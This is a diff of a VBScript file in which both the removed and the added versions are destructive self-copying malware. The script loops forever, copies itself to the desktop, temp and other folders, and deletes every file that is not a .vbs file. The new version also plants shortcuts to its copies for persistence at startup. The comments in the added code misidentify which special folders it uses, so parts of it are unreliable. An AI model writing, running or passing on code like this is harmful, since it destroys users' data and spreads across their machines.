@@ -1,60 +1,49 @@
-Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 strScriptPath = WScript.ScriptFullName
 
-' Specify the folders in which you want to delete files (modify as needed)
-foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
+' Specify the number of copies you want to create
+numCopies = 5
 
-' Get the path to the desktop folder
-strDesktopFolder = objShell.SpecialFolders("Desktop")
-
-' Loop indefinitely
-Do
-    ' Generate a random number for the copy iteration
-    randomIteration = Int((1000 * Rnd) + 1)
-    
-    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
-    
-    ' Create a copy of the script on the desktop
-    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
-    
-    ' Get the list of folders on the desktop
-    Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
-    Set colFolders = objDesktopFolder.SubFolders
-    
-    ' Iterate through each folder and create a copy of the script
-    For Each objFolder In colFolders
-        strFolderCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
+Do While True
+    For i = 1 To numCopies
+        strCopyPath = objFSO.GetParentFolderName(strScriptPath) & "\Copy" & i & ".vbs"
+        objFSO.CopyFile strScriptPath, strCopyPath
         
-        On Error Resume Next
-        objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
-        On Error GoTo 0
+        ' Get the path to the desktop folder
+        strDesktopFolder = objFSO.GetSpecialFolder(0) ' 0 represents the Desktop folder
+        
+        ' Create a copy of the script on the desktop
+        strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
+        objFSO.CopyFile strCopyPath, strDesktopCopyPath
+        
+        ' Get the path to the startup folder
+        strStartupFolder = objFSO.GetSpecialFolder(2) ' 2 represents the Startup folder
+        
+        ' Create a shortcut to the copied script in the startup folder
+        Set objShell = CreateObject("WScript.Shell")
+        Set objShortcut = objShell.CreateShortcut(strStartupFolder & "\Copy" & i & ".lnk")
+        objShortcut.TargetPath = strDesktopCopyPath
+        objShortcut.Save
     Next
-    
-    ' Delete all files except VBS files within the specified folders
-    For Each folderPath In foldersToDelete
-        DeleteFilesExceptVBS folderPath
-    Next
-Loop
 
-Sub DeleteFilesExceptVBS(folderPath)
-    On Error Resume Next
-    
-    Set folder = objFSO.GetFolder(folderPath)
-    If Err.Number = 0 Then
-        For Each file In folder.Files
-            If LCase(objFSO.GetExtensionName(file.Path)) <> "vbs" Then
-                objFSO.DeleteFile file.Path
+    ' Loop through the desktop folder and delete non-vbs files
+    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
+        If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
+            objFSO.DeleteFile objFile.Path, True
+        End If
+    Next
+
+    ' Loop through the file explorer and delete non-vbs files
+    strExplorerPath = objShell.Namespace(0).Self.Path
+    Set objExplorerFolder = objFSO.GetFolder(strExplorerPath)
+    For Each objSubFolder In objExplorerFolder.SubFolders
+        For Each objFile In objSubFolder.Files
+            If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
+                objFSO.DeleteFile objFile.Path, True
             End If
         Next
-        
-        ' Recursively delete files in subfolders
-        For Each subfolder In folder.Subfolders
-            DeleteFilesExceptVBS subfolder.Path
-        Next
-    End If
+    Next
     
-    On Error GoTo 0
-End Sub
+    ' Wait for a certain amount of time before looping again
+    WScript.Sleep 0 
+Loop
